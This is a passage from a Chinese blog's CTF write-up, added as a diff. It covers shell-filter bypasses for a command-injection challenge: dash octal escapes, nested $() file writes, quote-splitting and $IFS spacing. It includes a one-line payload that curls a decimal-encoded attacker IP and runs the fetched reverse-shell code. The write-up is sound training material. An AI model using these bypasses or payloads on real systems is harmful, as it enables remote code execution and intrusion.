+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">'Error!'</span>
+
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token string">'5000'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>没什么东西，比fuzz结果多过滤了几个单词</p>
+<h3 id="shell小技巧"><a href="#shell小技巧" class="headerlink" title="shell小技巧"></a>shell小技巧</h3><p>我连这都不知道，实属愚蠢的一匹<br>$v会直接使命令行执行v的值，如下</p>
+<pre class=" language-shell"><code class="language-shell">lzx@ubuntu:~/Desktop$ a=ls
+lzx@ubuntu:~/Desktop$ $a
+c-jwt-cracker-master  homework_OS      ping.php  test.php
+cookie_crash.rb       php_mt_seed-4.0  test
+</code></pre>
+<p>而$(cmd)就会把cmd执行的结果输入到命令行，也就等价于反引号，现在想起来才发现，我太垃圾了</p>
+<h3 id="sh特性"><a href="#sh特性" class="headerlink" title="sh特性"></a>sh特性</h3><p>从报错中可以得知执行命令的shell是&#x2F;bin&#x2F;sh，一般来说这是一个软链接，链接到&#x2F;bin&#x2F;dash<br>本地测试发现其可以解析八进制，也就是可以使用八进制绕过一切，基本上约等于任意命令执行<br>但是只有在引号里的八进制才能被解析成字符，而引号又会转义绝大多数的元字符，弹shell中使用的&gt;&amp;等字符就被转义了，还是不能一个语句打穿<br>不过幸好留了一个&gt;，可以写文件，而$()能嵌套，最终导致任意文件写，再让shell去执行就可以了<br>$($(echo “cmd”)&gt;$(echo “filepath”))<br>等价于cmd&gt;filepath，而cmd和filepath又全都是在引号里面，echo出来的，所以可以使用八进制绕过一切大法打通</p>
+<h3 id="垃圾zsh"><a href="#垃圾zsh" class="headerlink" title="垃圾zsh"></a>垃圾zsh</h3><p>本地测试的时候一开始用的zsh(因为比较酷炫)，然后发现zsh啥特性都没有，$IFS占位符都不能替代空格，八进制绕过什么的都不存在，切到最原始的sh之后应有尽有，bash也只能用用$IFS，没有神奇八进制绕过<br>bash可以十六进制绕过，dash使用八进制时只需\111这种格式即可，而bash则需要\x11这种格式</p>
+<h3 id="神仙的神仙做法"><a href="#神仙的神仙做法" class="headerlink" title="神仙的神仙做法"></a>神仙的神仙做法</h3><p>神仙就是神仙啊，碾压我秒杀垃圾题目</p>
+<h4 id="trick1-引号打断"><a href="#trick1-引号打断" class="headerlink" title="trick1-引号打断"></a>trick1-引号打断</h4><p>这个倒不算特别稀奇，之前也就学会了这个点，Linux引号不打断输入，只是作为转义元字符的符号，所以”cu””rl”这样子的命令也是能执行的</p>
+<h4 id="trick-2-IP的十进制表示"><a href="#trick-2-IP的十进制表示" class="headerlink" title="trick-2 IP的十进制表示"></a>trick-2 IP的十进制表示</h4><p>这个操作我是有所耳闻的，这样子就直接绕过ip中.不在可用字符中的限制，我太垃圾了，学过的东西也应用不起来<br>然后<code>$(&quot;cu&quot;&quot;rl&quot;$IFS&quot;795315244&quot;)</code>在自己vps上放一个弹shell语句，curl取回的结果直接执行，$IFS占位符代替空格，一键打通，太牛逼了</p>
+<h3 id="something-about-IFS"><a href="#something-about-IFS" class="headerlink" title="something about $IFS"></a>something about $IFS</h3><p>感觉没有想象中一个占位符那么简单，比如$IFS后如果直接接东西的话，如何辨别这个变量名到底是$IFS还是$IFSxx呢，目前测试的结果是$IFSxx后面的内容会被忽略掉，空格分号引号管道符之类的都能用来分隔</p>
+<h3 id="语义分析"><a href="#语义分析" class="headerlink" title="语义分析"></a>语义分析</h3><p>有一瞬间感觉直接输入数字输入的参数就是数字，带了引号之后就变成字符串了。。。。我着实是个憨批，输入参数必然是当字符串用的啊，而引号也只不过是个范围转义罢了，不要想太多<br>语义分析语义分析</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
+              <a href="/tags/shell/" rel="tag"># shell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Python%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7.html" rel="prev" title="Python特殊属性">
+      <i class="fa fa-chevron-left"></i> Python特殊属性
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E5%9E%83%E5%9C%BE%E5%AD%A6%E6%A0%A1%E7%9A%84%E5%A5%87%E6%80%AA%E8%A7%84%E5%88%99.html" rel="next" title="垃圾学校的奇怪网络规则">
+      垃圾学校的奇怪网络规则 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XCTF-%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%80%E5%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">[XCTF]华为第一场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell-1"><span class="nav-number">1.1.</span> <span class="nav-text">webshell_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mine1-1"><span class="nav-number">1.2.</span> <span class="nav-text">mine1_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mine2"><span class="nav-number">1.3.</span> <span class="nav-text">mine2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#update"><span class="nav-number">1.3.1.</span> <span class="nav-text">update</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pyer"><span class="nav-number">1.4.</span> <span class="nav-text">pyer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD"><span class="nav-number">1.4.1.</span> <span class="nav-text">数据库类型判断</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">类型转换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.4.2.</span> <span class="nav-text">题解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cloud"><span class="nav-number">1.5.</span> <span class="nav-text">cloud</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HIDS"><span class="nav-number">1.6.</span> <span class="nav-text">HIDS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shell%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="nav-number">1.6.1.</span> <span class="nav-text">shell小技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sh%E7%89%B9%E6%80%A7"><span class="nav-number">1.6.2.</span> <span class="nav-text">sh特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9E%83%E5%9C%BEzsh"><span class="nav-number">1.6.3.</span> <span class="nav-text">垃圾zsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A5%9E%E4%BB%99%E7%9A%84%E7%A5%9E%E4%BB%99%E5%81%9A%E6%B3%95"><span class="nav-number">1.6.4.</span> <span class="nav-text">神仙的神仙做法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#trick1-%E5%BC%95%E5%8F%B7%E6%89%93%E6%96%AD"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">trick1-引号打断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#trick-2-IP%E7%9A%84%E5%8D%81%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">trick-2 IP的十进制表示</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#something-about-IFS"><span class="nav-number">1.6.5.</span> <span class="nav-text">something about $IFS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90"><span class="nav-number">1.6.6.</span> <span class="nav-text">语义分析</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
